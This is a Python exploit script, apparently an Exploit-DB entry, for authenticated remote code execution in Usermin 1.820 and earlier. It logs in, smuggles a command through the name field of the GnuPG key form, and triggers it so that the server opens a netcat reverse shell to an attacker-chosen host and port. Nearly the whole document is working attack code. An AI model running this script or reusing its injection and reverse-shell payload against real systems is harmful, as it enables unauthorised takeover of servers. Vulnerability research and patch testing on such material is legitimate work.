# Exploit Title: Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)
# Rework Date: 31.10.2024
# Author: Numan Turle Reworker: Tunahan TEKEOÄžLU
# Vendor Homepage: https://www.webmin.com/usermin.html
# Software Link: https://github.com/webmin/usermin
# Version: <=1820

#!/usr/bin/python3
# -*- coding: utf-8 -*-

import argparse, requests, warnings, json, re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from cmd import Cmd

warnings.simplefilter('ignore', InsecureRequestWarning)

def init():
    parser = argparse.ArgumentParser(description='Usermin - Remote Code Execution (Authenticated) ( Version 1.820 )')
    parser.add_argument('-u', '--host', help='Host', type=str, required=True)
    parser.add_argument('-l', '--login', help='Username', type=str, required=True)
    parser.add_argument('-p', '--password', help='Password', type=str, required=True)
    parser.add_argument('--lhost', help='Local IP for reverse shell', type=str, required=True)
    parser.add_argument('--lport', help='Local port for reverse shell', type=int, required=True)
    args = parser.parse_args()
    exploit(args)

def exploit(args):
    session = requests.Session()
    target = "https://{}:20000".format(args.host)
    username = args.login
    password = args.password
    listen_ip = args.lhost
    listen_port = args.lport

    print("[+] Target {}".format(target))

    headers = {
        'Cookie': 'redirect=1; testing=1;',
        'Referer': target
    }

    login = session.post(target + "/session_login.cgi", headers=headers, verify=False, data={"user": username, "pass": password})
    login_content = str(login.content)
    search = "webmin_search.cgi"
    check_login_string = re.findall(search, login_content)

    if check_login_string:
        print("[+] Login successfully")
        print("[+] Setup GnuPG")

        payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f;".format(listen_ip, listen_port)
        post_data = {
            "name": '";{}echo "'.format(payload),
            "email": "1337@webmin.com",
        }

        print("[+] Payload {}".format(post_data))

        session.headers.update({'referer': target})
        
        create_secret = session.post(target + "/gnupg/secret.cgi", verify=False, data=post_data)
        create_secret_content = str(create_secret.content)

        search = "successfully"
        check_exp = re.findall(search, create_secret_content)

        if check_exp:
            print("[+] Setup successful")
            print("[+] Fetching key list")

            session.headers.update({'referer': target})
            key_list = session.post(target + "/gnupg/list_keys.cgi", verify=False)
            last_gets_key = re.findall("edit_key.cgi\?(.*?)'", str(key_list.content))[-2]
            print("[+] Key : {}".format(last_gets_key))

            session.headers.update({'referer': target})
            try:
                key_list = session.post(target + "/gnupg/edit_key.cgi?{}".format(last_gets_key), verify=False, timeout=3)
            except requests.exceptions.ReadTimeout:
                pass

            print("[+] 5ucc355fully_3xpl017")
        else:
            print("[-] An unexpected error occurred")
    else:
        print("[-] AUTH : Login failed.")

if __name__ == "__main__":
    init()
